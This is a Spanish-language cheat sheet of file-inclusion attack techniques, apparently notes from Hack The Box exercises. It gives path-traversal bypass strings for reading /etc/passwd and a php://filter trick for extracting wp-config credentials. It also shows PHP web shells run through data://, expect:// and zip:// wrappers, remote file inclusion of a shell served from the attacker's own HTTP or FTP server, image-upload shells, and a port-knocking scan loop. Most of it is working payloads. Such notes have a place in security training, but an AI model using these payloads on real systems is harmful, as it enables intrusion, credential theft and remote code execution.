# LFI & Path Traversal

## LFI
- [Payloads Fuzzing](https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt)
    - [An other one but for linux paths](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
    - [Windows paths](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
- Ejemplo para bypassear filtros: `....//....//....//....//etc/passwd`
- Encodearlo en URL también sirve: `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`

## como poder ver archivos mediante path traversal con PHP wrappers
- `php://filter/read=convert.base64-encode/resource=ARCHIVO-PHP`
- Con esto podriamos ver una clave en texto plano en un wordpress, en el wp-config por ejemplo, el phpinfo, etc.

## Ejemplo de RCE
- `echo '<?php system($_GET["cmd"]); ?>' | base64`
- `http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`

## Expect PHP Wrapper
- Este wrapper permite correr comandos directo desde URL parecido a las web shells
```bash
GNT@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## RFI (Remote file inclusion)
- Permite a un atacante incluir un archivo generalmente explotando la inclusión de un archivo dinamico implementado en el aplicativo.
- Ocurre cuando en un user input no hay una validación apropiada.
- en PHP podemos chequearlo con `allow_url_include`, también podemos directamente incluir un URL como payload.
    - `http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`

### RCE + RFI
- `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
- `python3 -m http.server 80`
- `http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
- con ftp `python3 -m pyftpdlib -p 21`
- `http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`

## LFI + File upload

### Mediante una imagen
- `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`

### Zip upload
- `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`
- `http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`

### knockd LFI file
- [fuente](https://sirensecurity.io/blog/port-knocking/)
- knockd es un daemon que se utiliza para abrir puertos en un firewall que está cerrado.
- Por ejemplo podemos visitar: `../../../../../../../../../../etc/knockd.conf`
- Y nos devuelve: `[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn`
- Esto significa que el puerto 22 está cerrado y que knockd está configurado para abrirlo.
- Para eso vamos a hacer un for loop:

```bash

for x in 4000 5000 6000; do
nmap -Pn --host-timeout 201 --max-retries 0 -p $x $IP;
done

```

- Esto nos va a dar el puerto que está abierto, y después podemos hacer un reverse shell con el puerto 22.